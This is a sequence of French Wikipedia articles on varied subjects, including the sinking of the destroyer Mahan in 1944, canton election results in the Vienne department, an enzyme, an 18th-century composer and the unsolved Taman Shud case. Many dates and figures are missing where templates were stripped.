Le matin du 7 décembre 1944, exactement trois ans jour pour jour après l'attaque japonaise contre Pearl Harbor, les troupes de la division d'infanterie américaine débarquèrent au sud de la ville d'Ormoc. Au même moment, le "Mahan" patrouillait dans le canal entre Leyte et l'île de Ponson. L'attaque amphibie de l'infanterie rencontra peu de résistance, mais neuf bombardiers japonais et quatre chasseurs d'escorte convergèrent vers le "Mahan". Dans son ouvrage "Kamikaze" (1997), écrit : « Les observateurs rapportèrent que, lors de l'une des attaques kamikazes les plus inhabituelles et les plus dévastatrices de 1944, les avions japonais ont utilisé des tactiques de lancement de torpilles, mais lorsqu'ils ont été touchés... ils sont passés à des attaques kamikazes, plongeant sur le "Mahan". » Au cours de l'attaque, les chasseurs de l'armée américaine abattirent trois avions japonais et en endommagèrent deux autres. Le "Mahan" en a abattu quatre, mais a été touché trois fois directement par des kamikazes, comme l'a observé David Sears dans "At War With the Wind" (2008), « ... le plus désastreux [étant] un impact direct sur la superstructure près du canon n° 2 ».
Explosant et envahi par les flammes, le "Mahan" fut dirigé par le commandant E. G. Campbell vers la ', une ligne de défense constituée par d'autres navires, dans un dernier espoir de le sauver avant de donner l'ordre d'abandonner le navire. Les destroyers et secoururent les survivants ; un officier et cinq hommes d'équipage étaient portés disparus, et treize autres étaient gravement blessés (notamment par des brûlures). Le destroyer américain "Walke" coula le "Mahan" à coups de torpilles et de tirs d'artillerie, car il était irrécupérable.
Le capitaine du "Mahan" salua la performance de son équipage pendant cette épreuve. Il qualifia leur réaction de disciplinée et courageuse. Le" Mahan" a reçu cinq battle stars pour son service pendant la Seconde Guerre mondiale.

</doc>
<doc id="8729910" url="https://fr.wikipedia.org/wiki?curid=8729910" title="Carlos Quintanar">
Carlos Quintanar

Carlos Quintanar, né le , à Ciudad Juárez, au Mexique et décédé le , à Poza Rica, au Mexique, est un joueur et entraîneur mexicain de basket-ball. Il évoluait au poste de pivot.

</doc>
<doc id="8729920" url="https://fr.wikipedia.org/wiki?curid=8729920" title="Gumuldjina">
Gumuldjina



</doc>
<doc id="8729929" url="https://fr.wikipedia.org/wiki?curid=8729929" title="Ouzoun Keupru">
Ouzoun Keupru



</doc>
<doc id="8729945" url="https://fr.wikipedia.org/wiki?curid=8729945" title="Aulonocara trematocephalum">
Aulonocara trematocephalum

Aulonocara trematocephalum est une espèce de poisson d'eau douce de la famille des cichlidae endémique de l'Afrique. Contrairement au reste des espèces du genre, selon RedList IUCN, elle proviendrait du lac Tanganyika et non du lac Malawi. Cette espèce n'est connue que de son holotype dont la localisation a été enregistrée par erreur au niveau de « l'extrémité nord du lac Tanganyika » et décrit comme "Tilapia trematocephala". Il a été suggéré plus tard que cette espèce appartenait sans doute au groupe d'évolution du lac Malawi et a été initialement inclus dans le genre Trematocranus (Eccles et Trewavas 1989, Konings 1995).
Taille.
Cette espèce mesure adulte une taille maximale avoisinant les .
Statut IUCN.
Cette espèce de cichlidae est classée « data déficient » (DD) sur la liste rouge des espèces menacées IUCN du fait de sa zone de répartition extrêmement mal connue. En effet l'aire de répartition de cette espèce semble être connue seulement de l'holotype. La localité type étant enregistrée à « l'extrémité nord du lac Tanganyika ».
Croisement, hybridation, sélection.
Il est impératif de maintenir cette espèce et le genre Aulonocara seul ou en compagnie d'autres espèces, d'autres genres, mais de provenance similaire. toutes les femelles du genre étant très semblables. Le commerce aquariophile a également vu apparaitre un grand nombre de spécimens provenant d'Asie notamment et aux couleurs des plus farfelues ou albinos, dû à la sélection, hybridation et autres procédés chimiques et barbares de laboratoires. Visuellement, de forme ou d'aspect parfois plus attrayant, mais l'aspect « voilé », « buble » ou autres aberrations et dégénérescences laissant la majorité du temps des troubles de comportement.

</doc>
<doc id="8729953" url="https://fr.wikipedia.org/wiki?curid=8729953" title="Glutamate-décarboxylase">
Glutamate-décarboxylase

La glutamate-décarboxylase ou décarboxylase d'acide glutamique (en anglais, "glutamic acid decarboxylase" ou GAD) est une lyase qui catalyse la réaction :
Cette enzyme réalise donc la conversion du -glutamate en γ-aminobutyrate (GABA) avec dégagement de dioxyde de carbone.
Chez les mammifères, elle existe sous deux isoformes codées par deux gènes différents, désignés par "GAD1" et "GAD2". Il s'agit des isoformes GAD67 et GAD65, dont la masse moléculaire est respectivement de et &lt;ref name="10.1016/0896-6273(91)90077-D"&gt;
&lt;/ref&gt;. Ces deux isoformes sont exprimés dans le cerveau, où le GABA intervient comme neurotransmetteur. Le gène "GAD2" est également exprimé dans le pancréas.
Il existe au moins deux autres isoformes, GAD25 et GAD44 (GAD embryonnaire, ou EGAD) dans le cerveau en cours de développement. Elles sont codées par des produits de transcription alternatifs, I-80 et I-86, du gène "GAD1" : la GAD25 est codée par les deux, tandis que la GAD44 est codée uniquement par I-80&lt;ref name="10.1128/MCB.14.11.7535"&gt;
&lt;/ref&gt;.
Des anticorps dirigés contre l'enzyme causent en particulier une atteinte auto-immune du cervelet et du pancréas 

</doc>
<doc id="8729958" url="https://fr.wikipedia.org/wiki?curid=8729958" title="Aulonocara trematocephala">
Aulonocara trematocephala



</doc>
<doc id="8729962" url="https://fr.wikipedia.org/wiki?curid=8729962" title="Antoinette Murat">
Antoinette Murat

Antoinette Murat, née le à Labastide-Fortunière (France) et morte le à Sigmaringen, capitale de la principauté de Hohenzollern-Sigmaringen, est un membre de la Maison Murat. 
Nièce de Joachim Murat, grand-duc de Berg et de Clèves puis roi de Naples et beau-frère de Napoléon Bonaparte, elle épouse le prince Charles prince de Hohenzollern-Sigmaringen et devient ainsi princesse de Hohenzollern-Sigmaringen.
Famille et éducation.
Antoinette Murat est la fille posthume de Pierre Murat (1748–1792) et de Louise d'Astorg, mariés à Labastide-Fortunière le . Son oncle Joachim Murat veille à lui assurer une éducation de qualité en la confiant aux bons soins de madame Campan.
Mariage et postérité.
Devenu grand-duc de Berg et de Clèves, prince de la Confédération du Rhin, Joachim Murat reçoit pour sa nièce une demande en mariage émanant du prince Antoine-Aloys de Hohenzollern-Sigmaringen pour son fils et héritier le prince Charles. Âgée de quinze ans, Antoinette épouse donc à Paris le le prince Charles de Hohenzollern-Sigmaringen.
Quatre enfants naissent de cette union :

</doc>
<doc id="8729973" url="https://fr.wikipedia.org/wiki?curid=8729973" title="Monastère de Daoú">
Monastère de Daoú

Le monastère de Daoú () est un monastère orthodoxe situé sur les flancs du Pentélique près de Rafína en Attique. Il est dédié au "Christ pantocrator".
Sa fondation initiale remonte au . Son narthex date du . Il a été rénové au avant d'être détruit par un raid pirate au . Il aurait alors été abandonné vers 1690. Il fut refondé en 1963.

</doc>
<doc id="8729974" url="https://fr.wikipedia.org/wiki?curid=8729974" title="Cap Sviatoï">
Cap Sviatoï



</doc>
<doc id="8729975" url="https://fr.wikipedia.org/wiki?curid=8729975" title="Canton de Chasseneuil-du-Poitou">
Canton de Chasseneuil-du-Poitou

Le canton de Chasseneuil-du-Poitou est une circonscription électorale française du département de la Vienne, en région Nouvelle-Aquitaine.
Histoire.
Un nouveau découpage territorial de la Vienne entre en vigueur à l'occasion des premières élections départementales suivant le décret du . Les conseillers départementaux sont, à compter de ces élections, élus au scrutin majoritaire binominal mixte. Les électeurs de chaque canton élisent au Conseil départemental, nouvelle appellation du Conseil général, deux membres de sexe différent, qui se présentent en binôme de candidats. Les conseillers départementaux sont élus pour au scrutin binominal majoritaire à deux tours, l'accès au second tour nécessitant 12,5 % des inscrits au . En outre la totalité des conseillers départementaux est renouvelée. Ce nouveau mode de scrutin nécessite un redécoupage des cantons dont le nombre est divisé par deux avec arrondi à l'unité impaire supérieure si ce nombre n'est pas entier impair, assorti de conditions de seuils minimaux. Dans la Vienne, le nombre de cantons passe ainsi de 38 à 19.
Le canton de Chasseneuil-du-Poitou est formé de communes des anciens cantons de Saint-Julien-l'Ars () et de Poitiers-7 (). Il est entièrement inclus dans l'arrondissement de Poitiers. Le bureau centralisateur est situé à Chasseneuil-du-Poitou.
Représentation.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Claude Eidelstein et Pascale Guittet (DVD, 37,74 %) et Xavier Moinier et Bernadette Vergnaud (PS, 32,86 %). Le taux de participation est de 54,81 % ( sur ) contre 51,35 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Claude Eidelstein et Pascale Guittet (DVD) sont élus avec 51,02 % des suffrages exprimés et un taux de participation de 54,35 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de Chasseneuil-du-Poitou, ce taux de participation est de 35,02 % ( sur ) contre 33,61 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Claude Eidelstein et Pascale Guittet (DVD, 58,55 %) et Vincent Chenu et Valérie Marmin (Union à gauche avec des écologistes, 41,45 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 33,96 % dans le département et 34,6 % dans le canton de Chasseneuil-du-Poitou. Claude Eidelstein et Pascale Guittet (DVD) sont élus avec 58,16 % des suffrages exprimés ( pour et ).
Composition.
Le canton de Chasseneuil-du-Poitou comprend treize communes entières.

</doc>
<doc id="8729976" url="https://fr.wikipedia.org/wiki?curid=8729976" title="Joubert-Nivelt">
Joubert-Nivelt

Le cabinet Joubert-Nivelt est un cabinet d'architecture navale français, fondé par Michel Joubert (1944-2016) et Bernard Nivelt à La Rochelle en 1974. Il est considéré comme l'un des meilleurs cabinets d'architecture navale française.
Dans les années 1980, ils sont parmi les premiers à dessiner les Open et des catamarans de course au large, précurseurs des trimarans ORMA ou MOD70.
Michel Joubert (né le à Meudon ; mort le à Bordeaux) décède des suites d'une longue maladie dans un hôpital bordelais. Fils de l'illustrateur Pierre Joubert, l’architecte naval rochelais, « l’un des plus grands de sa génération, aura laissé une empreinte formidable sur le monde du nautisme et de la plaisance et des bateaux en général. »

</doc>
<doc id="8729978" url="https://fr.wikipedia.org/wiki?curid=8729978" title="IK Hellas Stockholm">
IK Hellas Stockholm

L’IK Hellas Stockholm est un club de handball qui se situe à Stockholm en Suède. 

</doc>
<doc id="8729983" url="https://fr.wikipedia.org/wiki?curid=8729983" title="Canton de Châtellerault-1">
Canton de Châtellerault-1

Le canton de Châtellerault-1 est une circonscription électorale française du département de la Vienne, en région Nouvelle-Aquitaine.
Histoire.
Un nouveau découpage territorial de la Vienne entre en vigueur à l'occasion des premières élections départementales suivant le décret du . Les conseillers départementaux sont, à compter de ces élections, élus au scrutin majoritaire binominal mixte. Les électeurs de chaque canton élisent au Conseil départemental, nouvelle appellation du Conseil général, deux membres de sexe différent, qui se présentent en binôme de candidats. Les conseillers départementaux sont élus pour au scrutin binominal majoritaire à deux tours, l'accès au second tour nécessitant 12,5 % des inscrits au . En outre la totalité des conseillers départementaux est renouvelée. Ce nouveau mode de scrutin nécessite un redécoupage des cantons dont le nombre est divisé par deux avec arrondi à l'unité impaire supérieure si ce nombre n'est pas entier impair, assorti de conditions de seuils minimaux. Dans la Vienne, le nombre de cantons passe ainsi de 38 à 19.
Le canton de Châtellerault-1 est formé de communes des anciens cantons de Châtellerault-Ouest (), de Lencloître () et de Châtellerault-Sud (), et d'une partie de Châtellerault. Il est entièrement inclus dans l'arrondissement de Châtellerault. Le bureau centralisateur est situé à Châtellerault.
Représentation.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Anne-Florence Bourat et Henri Colin (UDI, 36,87 %) et Thomas Fayol et Sylviane Lescop (FN, 31,32 %). Le taux de participation est de 45,43 % ( sur ) contre 51,35 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Anne-Florence Bourat et Henri Colin (UDI) sont élus avec 63,7 % des suffrages exprimés et un taux de participation de 48,29 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de Châtellerault-1, ce taux de participation est de 27,62 % ( sur ) contre 33,61 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Anne-Florence Bourat et Henri Colin (Union des démocrates et indépendants, 54,7 %) et Maryse Lacombe et Jerome Toulet (RN, 24,27 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 33,96 % dans le département et 29,67 % dans le canton de Châtellerault-1. Anne-Florence Bourat et Henri Colin (Union des démocrates et indépendants) sont élus avec 72,68 % des suffrages exprimés ( pour et ).
Composition.
Le canton de Châtellerault-1 comprend :

</doc>
<doc id="8729994" url="https://fr.wikipedia.org/wiki?curid=8729994" title="Canton de Châtellerault-2">
Canton de Châtellerault-2

Le canton de Châtellerault-2 est une circonscription électorale française du département de la Vienne, en région Nouvelle-Aquitaine.
Histoire.
Un nouveau découpage territorial de la Vienne entre en vigueur à l'occasion des premières élections départementales suivant le décret du . Les conseillers départementaux sont, à compter de ces élections, élus au scrutin majoritaire binominal mixte. Les électeurs de chaque canton élisent au Conseil départemental, nouvelle appellation du Conseil général, deux membres de sexe différent, qui se présentent en binôme de candidats. Les conseillers départementaux sont élus pour au scrutin binominal majoritaire à deux tours, l'accès au second tour nécessitant 12,5 % des inscrits au . En outre la totalité des conseillers départementaux est renouvelée. Ce nouveau mode de scrutin nécessite un redécoupage des cantons dont le nombre est divisé par deux avec arrondi à l'unité impaire supérieure si ce nombre n'est pas entier impair, assorti de conditions de seuils minimaux. Dans la Vienne, le nombre de cantons passe ainsi de 38 à 19.
Le canton de Châtellerault-2 est formé de communes des anciens cantons de Saint-Gervais-les-Trois-Clochers (), de Dangé-Saint-Romain () et de Lencloître (), et d'une partie de Châtellerault. Il est entièrement inclus dans l'arrondissement de Châtellerault. Le bureau centralisateur est situé à Châtellerault.
Représentation.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Valérie Dauge et Alain Pichon (DVD, 39,55 %) et Eric Audebert et Cécile Perrot (FN, 30,83 %). Le taux de participation est de 48,72 % ( sur ) contre 51,35 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Valérie Dauge et Alain Pichon (DVD) sont élus avec 63,3 % des suffrages exprimés et un taux de participation de 51,27 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de Châtellerault-2, ce taux de participation est de 30,26 % ( sur ) contre 33,61 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Valérie Dauge et Alain Pichon (Union au centre et à droite, 54,22 %) et Marion Latus et Sebastien Villeneuve (RN, 21,87 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 33,96 % dans le département et 31,34 % dans le canton de Châtellerault-2. Valérie Dauge et Alain Pichon (Union au centre et à droite) sont élus avec 73,54 % des suffrages exprimés ( pour et ).
Composition.
Le canton de Châtellerault-2 comprend :

</doc>
<doc id="8729995" url="https://fr.wikipedia.org/wiki?curid=8729995" title="Giovanni Giorgi">
Giovanni Giorgi

Giovanni Giorgi est un prêtre et compositeur italien mort à Lisbonne en 1762.
Biographie.
On sait peu de choses de la vie du compositeur Giovanni Giorgi. Sa date de naissance est inconnue mais on suppose qu'il est originaire de Venise ou de Vénétie. 
Il fut probablement l'élève d'Antonio Lotti et on peut supposer qu'il a suivi une formation à la Cappella Ducale de San Marco à Venise.
En 1719, il occupe le poste de maître de chapelle à la basilique Saint-Jean-de-Latran à Rome où il succède à Giuseppe Ottavio Pitoni.
IL y écrit une musique pour les besoins de la liturgie, comme des offertoires ou des motets. 
En 1725, il quitte Rome pour aller à la Cour de Lisbonne comme compositeur et pédagogue.
Il décède à Lisbonne en 1762.
Œuvre.
La production musicale de Giorgi est principalement conservée dans les archives de la basilique Sainte-Marie-Majeure et de la basilique Saint-Jean-de-Latran, à Rome, et dans les archives de la cathédrale Sainte-Marie-Majeure de Lisbonne où elle a échappé aux destructions causées par le séisme de 1755 à Lisbonne.
Giorgi a écrit presque exclusivement de la musique liturgique, tel l'offertoire.
Bien qu'appartenant à la période de transition entre le style baroque et le style préclassique, sa musique a conservé de nombreuses caractéristiques archaïques de la polyphonie de la Renaissance.
La découverte de sa musique a été un véritable coup de foudre pour le chef argentin Leonardo García-Alarcón, qui le considère comme le Bach italien.

</doc>
<doc id="8729997" url="https://fr.wikipedia.org/wiki?curid=8729997" title="Canton de Châtellerault-3">
Canton de Châtellerault-3

Le canton de Châtellerault-3 est une circonscription électorale française du département de la Vienne, en région Nouvelle-Aquitaine.
Histoire.
Un nouveau découpage territorial de la Vienne entre en vigueur à l'occasion des premières élections départementales suivant le décret du . Les conseillers départementaux sont, à compter de ces élections, élus au scrutin majoritaire binominal mixte. Les électeurs de chaque canton élisent au Conseil départemental, nouvelle appellation du Conseil général, deux membres de sexe différent, qui se présentent en binôme de candidats. Les conseillers départementaux sont élus pour au scrutin binominal majoritaire à deux tours, l'accès au second tour nécessitant 12,5 % des inscrits au . En outre la totalité des conseillers départementaux est renouvelée. Ce nouveau mode de scrutin nécessite un redécoupage des cantons dont le nombre est divisé par deux avec arrondi à l'unité impaire supérieure si ce nombre n'est pas entier impair, assorti de conditions de seuils minimaux. Dans la Vienne, le nombre de cantons passe ainsi de 38 à 19.
Le canton de Châtellerault-3 est formé de communes des anciens cantons de Pleumartin (), de Châtellerault-Nord () et de Châtellerault-Sud (), et d'une partie de Châtellerault. Il est entièrement inclus dans l'arrondissement de Châtellerault. Le bureau centralisateur est situé à Châtellerault.
Représentation.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Jean-Pierre Abelin et Pascale Moreau (DVD, 41,94 %) et Cyril Cibert et Béatrice Forestier (PS, 24,35 %). Le taux de participation est de 50,47 % ( sur ) contre 51,35 % au niveau départemental et 50,17 % au niveau national. 
Au second tour, Jean-Pierre Abelin et Pascale Moreau (DVD) sont élus avec 59,43 % des suffrages exprimés et un taux de participation de 50,38 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de Châtellerault-3, ce taux de participation est de 32,93 % ( sur ) contre 33,61 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Pascale Moreau et Gérard Pérochon (DVD, 36,66 %) et Cyril Cibert et Elodie Rivet (DVG, 24,72 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 33,96 % dans le département et 33,5 % dans le canton de Châtellerault-3. Pascale Moreau et Gérard Pérochon (DVD) sont élus avec 54,9 % des suffrages exprimés ( pour et ).
Composition.
Le canton de Châtellerault-3 comprenait à sa création :
À la suite de la création de la commune nouvelle de Senillé-Saint-Sauveur au , le canton comprend désormais neuf communes entières et une fraction.

</doc>
<doc id="8730009" url="https://fr.wikipedia.org/wiki?curid=8730009" title="Affaire Taman Shud">
Affaire Taman Shud

L’affaire Taman Shud, aussi connue sous le nom de « Mystère de l’homme de Somerton », est une affaire qui n’a jamais été résolue, concernant la découverte d’un cadavre masculin non identifié, à , le , sur la plage de Somerton Park, près d'Adélaïde, dans le sud de l’Australie. Le nom de l’affaire provient de la phrase « Tamam shud » – signifiant « fini » ou « terminé » en persan – qui figurait sur la dernière page des Rubaiyat d’Omar Khayyam, retrouvée dans une poche de pantalon de la victime. Lorsque les journaux de l'époque ont évoqué l'affaire, les mots « Tamam Shud » ont été mal orthographiés en « Taman Shud », d'où le nom de l'affaire.
Considérée comme « l’un des plus profonds mystères australiens », l’affaire a fait l’objet de nombreuses spéculations qui se poursuivent encore aujourd’hui, concernant l’identité de la victime, les événements ayant conduit à sa mort et les causes du décès.
L’intérêt du public pour l’affaire a été accentué par de nombreux facteurs : l’époque à laquelle se déroule l’affaire, période de grandes tensions pendant la guerre froide, la présence de ce qui ressemble à un code secret sur un bout de papier retrouvé dans la poche de la victime, l’utilisation d’un poison indétectable, l'incapacité d'identifier la victime et la possibilité d'une histoire d'amour tragique en toile de fond.
L'essentiel de l'enquête s'est déroulé en Australie, mais des services de police du monde entier ont été mis à contribution, notamment en participant à l'effort pour identifier la victime ou pour faire progresser les pistes internationales.
Découverte du corps.
La victime.
Le corps de la victime est découvert le , à , sur la plage de Somerton, près d'Adélaïde en Australie. La police est appelée immédiatement. À son arrivée, le corps de la victime est couché sur le sable, sa tête reposant sur la digue, les jambes croisées vers la mer. La police ne décèle aucune marque indiquant que le corps ait été déplacé. Le bras gauche de l’homme est tendu et son bras droit est plié. La police trouve une cigarette qui n'a pas été allumée derrière l’oreille de la victime et une cigarette à moitié consumée dans le col droit de son manteau. Une fouille des poches révèle un ticket de train de seconde classe allant jusqu’à Henley Beach depuis Adélaïde (non utilisé), un ticket de bus de la ville (utilisé), un petit peigne américain en aluminium, un paquet de chewing-gum aux fruits à moitié plein, un paquet de cigarettes de la marque « Army Club » contenant des cigarettes de la marque « Kensitas » et une boîte d’allumettes Bryant &amp; May au trois quarts vide. Le ticket de bus a été utilisé pour descendre à un arrêt situé à environ mètres au nord de la position du corps de la victime. L’homme n’avait pas d’argent dans ses poches.
Les témoins qui se présentent déclarent que, le soir du , ils ont aperçu un homme ressemblant à la victime, couché sur le dos, dans la même position et au même endroit, contre la digue qui fait face à l'hospice pour enfants infirmes. Un couple a vu l’homme, aux environs de , étendre son bras gauche avant de le relâcher mollement, comme s’il s'étirait. Un autre couple, qui a pu observer l’homme entre et , alors que l’éclairage public était allumé, déclare qu’ils ne l'ont pas vu bouger pendant cette demi-heure, même s'ils ont eu l’impression que l’homme avait changé de position pendant ce laps de temps. Bien qu’ils se soient fait la remarque que l’homme pouvait être mort, puisqu’il ne réagissait pas aux moustiques, ils ont simplement conclu qu'il devait certainement être saoul ou endormi et ils n’ont pas cherché à en savoir plus. Les témoins affirment que le corps était dans la même position que lors de sa découverte par la police.
L’autopsie.
Selon le pathologiste Sir John Burton Cleland, professeur émérite à l’université d’Adélaïde, l’homme était d’apparence « britannique » et devait être âgé de 40 à 45 ans ; il était dans une forme physique particulièrement bonne. La victime « mesurait 1,80 m , avec des yeux noisette, des cheveux blonds tirant sur le roux, grisonnants sur les tempes, avec une taille étroite et les épaules larges, des mains et des ongles ne montrant pas de signe de travail manuel, des grands et petits orteils taillés en biseaux, comme ceux des danseurs ou des personnes portant des bottes avec des bouts pointus, et des mollets musclés comme ceux des danseurs de ballet, bien qu’il puisse s’agir de traits génétiques et qu’on rencontre ces caractéristiques chez les coureurs de fond ».
La victime était habillée avec des habits de bonne qualité, comprenant une chemise blanche, une cravate rouge et bleu, un pantalon marron, des chaussettes, des chaussures et, bien que la journée ait été particulièrement chaude et la soirée très douce, un pullover brun tricoté et une veste élégante grise et marron à double boutonnage de style européen. Toutes les étiquettes de ses vêtements avaient été retirées et il ne possédait ni portefeuille, ni chapeau (ce qui était inhabituel en 1948, surtout pour un homme en costume). Rasé de près et sans marque distinctive, l’homme ne possédait aucun document relatif à son identité. Son empreinte dentaire ne correspondait à aucune de celles connues en Australie.
L’autopsie réalisée après la découverte du corps situe l'heure du décès aux environs de 2 heures du matin, le . Elle révèle aussi que le dernier repas ingéré par la victime était une tourte, mangée environ 3 ou 4 heures avant le décès, mais les examens ne permettent pas de déceler de traces de substances suspectes dans le corps. Le pathologiste Dr. Dwyer conclut : « je suis quasiment sûr que la cause de la mort n'est pas naturelle... Le poison utilisé pourrait être un barbiturique ou un soluble hypnotique ». Bien que l'empoisonnement ait été la thèse privilégiée, la tourte n'a pas été considérée comme pouvant être à l'origine du poison. À part ces éléments, le médecin légiste n'a pas été capable de déterminer avec certitude la cause de la mort, ni si l'homme que les témoins disent avoir vu le soir du était bien la victime. Scotland Yard est appelé en renfort sur l'affaire, mais sans résultats notables. La diffusion à l'échelle mondiale d'une photographie de l'homme et de ses empreintes digitales ne mène à aucune identification. Comme le corps n'est pas identifié, il est embaumé le .
Réactions médiatiques.
Les deux quotidiens d'Adélaïde, "The Advertiser" et "The News", ont tous les deux couvert la mort séparément. The Advertiser, qui était alors un quotidien publié le matin, est le premier à faire mention de l'affaire dans un petit article, en page 3 de son édition du . Titré « Un corps retrouvé sur la plage », on pouvait y lire :
« Un corps, qu'on suppose être celui d'E.C Johnson, un homme de 45 ans d'Arthur St, Payneham, a été découvert sur la plage de Somerton, en face de l'Hospice pour Enfant Infirme, hier matin. La découverte a été faite par Mr J. Lyons, de Whyte Rd, Somerton. L'inspecteur H. Strangway et l'agent J. Moss ont ouvert une enquête ». The News, dans son édition de l'après-midi, fait paraître l'histoire en Une, donnant plus de détails sur la victime.
Enquête et rebondissement.
Identification.
Le , E.C. Johnson, dont le nom avait été donné comme victime potentielle, se présente au poste de police pour prouver qu'il est bien vivant. Le même jour, The News publie une photographie de la victime en Une de son édition, ce qui entraîne une nouvelle vague d'appels concernant l'identité possible du corps. Le , la police annonce que les empreintes de l'homme ne figurent pas sur les fichiers de police du sud de l'Australie. Le , The Advertiser rapporte que la police cherche, dans les dossiers militaires, un homme qui aurait été vu en train de boire un verre dans un hôtel à Glenelg, le . Pendant qu'il buvait, l'inconnu aurait montré une carte de pension militaire portant le nom « Solomonson ».
Des nombreuses spéculations crédibles sur l'identité de la victime sont faites, dont une au début du mois de , quand deux personnes identifient le corps comme étant celui d'un ancien bûcheron de 63 ans, Robert Walsh. Une troisième personne, James Mack, qui a vu le corps lui aussi et n'a pas pu l'identifier dans un premier temps, contacte la police, une heure plus tard, pour déclarer qu'il s'agit bien de Robert Walsh. Robert Walsh avait quitté Adélaïde un mois plus tôt pour acheter des moutons à Queensland, mais il n'était pas revenu à Noël comme prévu. La police reste néanmoins plutôt sceptique car Robert Walsh serait trop vieux pour être la victime. Elle remarque cependant que le corps retrouvé présente des caractéristiques cohérentes avec la thèse du bûcheron, bien que l'état de ses mains indique qu'il n'a pas coupé de bois depuis au moins 18 mois. L'identification de la victime en tant que Robert Walsh tombe finalement à l'eau quand Elizabeth Thompson, l'une des personnes qui avait identifié le corps comme étant celui du bûcheron, se rétracte en le voyant pour la deuxième fois. Elle note alors qu'il manque une cicatrice caractéristique sur le corps de la victime et que la taille des jambes ne correspond pas à Mr Walsh.
Au début du mois de , il y a 8 identifications plausibles, dont celle faite par deux habitants de Darwin, qui pensent que le corps est celui d'un de leurs amis, ainsi que d'autres personnes qui évoquent un garçon d'écurie, un travailleur sur un bateau à vapeur ou un Suédois. Des enquêteurs de l'État de Victoria pensent, pendant un moment, qu'il peut s'agir d'un de leurs compatriotes à cause de la similitude entre les marques de blanchisserie que présentent les vêtements de la victime et celles utilisées par les blanchisseurs de Melbourne. Après la publication de la photographie de l'homme dans l'État de Victoria, 28 personnes déclarent qu'elles connaissent son identité. Les enquêteurs de Victoria réfutent toutes les déclarations et indiquent que « d'autres éléments » permettent de conclure qu'il est finalement improbable que l'homme soit de Victoria.
En , la police déclare qu'elle a reçu la « solution » au problème de l'identité de la victime, provenant de civils qui pensent qu'ils connaissent l'homme ou qu'ils l'ont rencontré. Pour la police, le seul indice réellement intéressant réside dans les vêtements que l'homme portait lors de sa mort.
La mallette marron.
L'affaire prend une nouvelle tournure, le , quand le personnel de la gare ferroviaire d'Adélaïde découvre une mallette marron dont l'étiquette a été enlevée et qui a été enregistrée au vestiaire de la gare, après , le . Dans la mallette se trouve une robe de chambre à carreaux rouges, , des chaussons rouges en feutre, 4 paires de caleçons (mais pas de chaussettes), un pyjama, du matériel de rasage, une paire de pantalons marron clair sur lesquels on trouve du sable, un tournevis d’électricien, un couteau de table taillé pour en faire un instrument tranchant, une paire de ciseaux aux pointes aiguisées ainsi qu'un pinceau à pochoir utilisé sur les bateaux de commerce pour marquer la cargaison.
La mallette contient également un carton de fil ciré orange de la marque Barbour, d'un « type inhabituel », qu'on ne trouve pas en Australie ; le même type que celui utilisé pour repriser la doublure des poches de la victime. Toutes les marques d'identification sur les vêtements ont été retirées, mais la police trouve le nom « T. Keane » sur une cravate, « Keane » sur un sac à linge et « Kean » sans le « e » sur un tricot de corps, ainsi que trois notes de blanchisserie: 1171/7, 4393/7 et 3053/7. La police pense alors que la personne qui a enlevé les identifications de vêtements a volontairement laissé en place ceux mentionnant « Keane », sachant qu'il ne s'agissait pas du véritable nom de la victime. Une enquête ultérieure révélera finalement que les marques « Keane » retrouvées étaient les seules à ne pas pouvoir être enlevées sans abîmer le vêtement.
On pense pendant un moment que la victime pourrait être un marin du nom de Tommy Reade, du SS Cycle, qui mouillait dans le port à ce moment-là, mais ses compagnons de bord réfutent catégoriquement cette théorie après avoir vu le corps à la morgue. Une enquête conclut qu'il n'y a aucun T. Keane porté disparu dans un pays anglophone et la publication mondiale des numéros de blanchisserie ne donne aucun résultat. Le manteau porté par la victime, fabriqué sur mesure, est inspecté par un tailleur d'Adélaïde qui indique que la confection particulière du vêtement prouve qu'il ne peut venir que des États-Unis, ce qui signifie que l'homme a séjourné aux États-Unis ou qu'il l'a acheté à un homme ayant séjourné aux États-Unis et partageant exactement les mêmes mensurations que lui.
